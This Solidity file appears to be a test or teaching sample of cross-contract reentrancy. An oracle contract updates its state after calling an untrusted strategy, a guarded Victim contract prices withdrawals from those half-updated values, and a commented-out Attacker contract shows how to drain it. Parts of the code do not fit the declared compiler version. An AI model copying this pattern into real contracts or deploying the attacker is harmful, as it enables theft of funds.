// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

interface IStrategy {
    function execute() external;
}


contract Victim {
    Oracle_ree public o;
    bool private flag = false;

    constructor(address _o)  public {
        o = Oracle_ree(_o);
    }

    modifier nonReentrant() {
        require(!flag, "Locked");
        flag = true;
        _;
        flag = false;
    }

    function withdraw() nonReentrant external returns (uint256) { // even if the victim correctly implements the reentracy guard, the attack still succeed
        uint256 rate = o.totalETHView() * 1e18 / o.totalSupplyView();
        uint256 amountETH = rate * 1000 / 1e18;

        (bool success, ) = (msg.sender).call.value(amountETH)("");
        require (success, "Failed to withdraw ETH");

        return amountETH;
    }

    function() external  {}
}

// THIS is the contract vulnerable to reentrancy
contract Oracle_ree {
    uint256 public totalETH;
    uint256 public totalSupply;

    function work(address strategy) external  {
        totalETH += msg.value;
        IStrategy(strategy).execute();
        totalSupply += msg.value;  // side-effect AFTER external call makes this contract unsafe, even if the money theft is performed on Victim, not this contract
    }

    function totalETHView() external view returns (uint256) {
        return totalETH;
    }
    function totalSupplyView() external view returns (uint256) {
        return totalSupply;
    }
}

// contract Attacker is IStrategy {
//     Victim public v;
//     Oracle_ree public o;

//     constructor(address  _v, address _o)  public {
//         v = Victim(_v);
//         o = Oracle_ree(_o);
//     }

//     function execute() external {
//         v.withdraw();
//     }

//     function() external  {
//         o.work(address(this));
//     }
// }